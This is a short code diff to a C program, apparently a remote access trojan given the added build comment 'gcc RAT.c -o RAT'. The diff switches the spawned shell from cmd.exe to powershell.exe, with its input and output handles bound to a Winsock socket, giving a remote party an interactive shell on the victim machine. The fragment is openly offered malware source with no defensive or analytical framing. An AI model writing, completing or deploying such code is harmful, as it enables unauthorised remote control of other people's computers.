@@ -52,10 +52,13 @@ int main()
 
     ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;
 
-    TCHAR cmd[255] = TEXT("cmd.exe");
+    TCHAR powershell[255] = TEXT("powershell.exe");
 
-    CreateProcess(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
+    CreateProcess(NULL, powershell, NULL, NULL, TRUE, 0, NULL, NULL, &ini_processo, &processo_info);
 
     return 0;
 
 }
+
+
+//gcc RAT.c -o RAT -lws2_32
